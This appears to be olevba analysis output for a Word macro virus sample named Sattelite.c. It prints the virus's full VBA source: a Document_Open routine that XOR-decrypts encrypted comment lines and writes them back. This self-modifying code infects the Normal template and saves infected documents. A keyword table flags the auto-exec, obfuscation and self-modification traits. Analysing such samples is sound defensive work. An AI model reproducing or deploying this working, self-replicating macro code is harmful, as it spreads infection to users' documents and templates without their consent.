olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sattelite.c-b4fdcdfad15528accc478a0548e31a4026d3b958
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sattelite.c-b4fdcdfad15528accc478a0548e31a4026d3b958 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 









































'wEiRd GeNiUs
'Document
Private Function encr(s, k As Integer)
Dim r: r = "": For f = 1 To Len(s): r = r + Chr((Asc(Mid$(s, f, 1))) Xor k): Next: encr = r
End Function
Private Sub Document_Open()
On Error Resume Next: W = 0
WhereAmI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(43, 1)
If WhereAmI = "'NormalTemplate" Then Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule Else: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule
With Iam: Z = .CountOfLines - 28: For X = 62 To Z:
If W = 20 Then W = 0
decrypt = .Lines(X, 1): W = W + 2: Y = Len(decrypt): Y = Y - 1: decrypt = Right$(decrypt, Y): .ReplaceLine X + 21, encr(decrypt, (W)): Next X: End With
Call ThisDoc: Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule: Flag = 0: GoTo Over
Again: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule: Flag = 1
Over:
With Iam: For X = 83 To 102: .ReplaceLine X, "'": Next X: End With
If Flag = 0 Then GoTo Again
NormalTemplate.Save: ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument: End Sub
'----------------------------------------------------------------------
Private Sub ThisDoc()
'Ml"Gppmp"Pgqwog"Lgzv
'Etthmgepmkj*AjefhaGejgahOa}$9$s`Gejgah@mwefha`
'Ivroihu(PotsuVtirceroih&;&@gjuc
'Gx|agf{&[i~mFgzeidXzgex|(5(Nid{m
'Yo~*Ki~Ikxxcox*7*Ki~c|oNeigod~$\HZxe`oi~$\HIegzedod~y";#$IenoGenfo
'_ix,Bc~aOm~~ei~,1,Bc~am`Xia|`mxi"ZN\~cfiox"ZNOca|cbibx$=%"OchiAchy`i
'@G.3.@a|cobZkc~bozk XL^|adkmz XLMac~a`k`z}&?' MajkCaj{bk Bg`k}&:<".?'
'QY0-0QsdyfuTse}u~d>FR@bzusd>FRS}`~u~dc8!9>Stu]te|u>\y~uc8$"<0!9
'[t2GQsaw:\[;2/205EW[@V2UW\[GA02Fzw|2\}`[|afs~~wv2/2F`gw2W~aw2\}`[|afs~~wv2/2Ts~aw
']r4AWugq<Z]=4(*463CQ]FP4SQZ]AG64Uzp4AWugq<Z]=4(*4664@|qz4Ql}`4Gav
'Kd"WAcqg*CK+"?" %UGKPF"EGLKWQ "Vjgl"CavKlqvcnngf"?"Vpwg"Gnqg"CavKlqvcnngf"?"Dcnqg
'Mb$QGewa,EM-$8:$&#SAMV@$CAJMQW&$Ej`$QGewa,EM-$8:$&&$Plaj$A|mp$Wqf
'O`&HitkOhurgjjcb&;&Rtsc&Ghb&GerOhurgjjcb&;&Rtsc&Rnch&C~or&Usd
'An(FgzeAf{|iddml(5(Nid{m(\`mf2([m|(Afnmk|agf(5(FgzeKizzamz2([m|(Kizzamz(5(Ik|Kizzamz2(Md{m2([m|(Afnmk|agf(5(Ik|Kizzamz2([m|(Kizzamz(5(FgzeKizzamz
']c~b*Ikxxcox0*\cxIeno*7*$Fcdoy";&*$Ied~ElFcdoy#0*Odn*]c~b
'[exd,Ebjioxecb6,"Hi`ixi@ebi,= ,"OcybxCj@ebi6,"Ebi~x@ebi,= ,Ze~Ochi
'Gh.@a|cG`}zobbkj.3.Hob}k.Zfk`. \k~bomkBg`k.:=".,)@a|cobZkc~bozk,.Kb}k. \k~bomkBg`k.:=".,)Jam{ck`z,
'U~t0Gydx
'Asffw~{fw2d#<"
'Sattelite v1.0
'--------------------------------------------------------------
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |V8%                 |Vjgl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

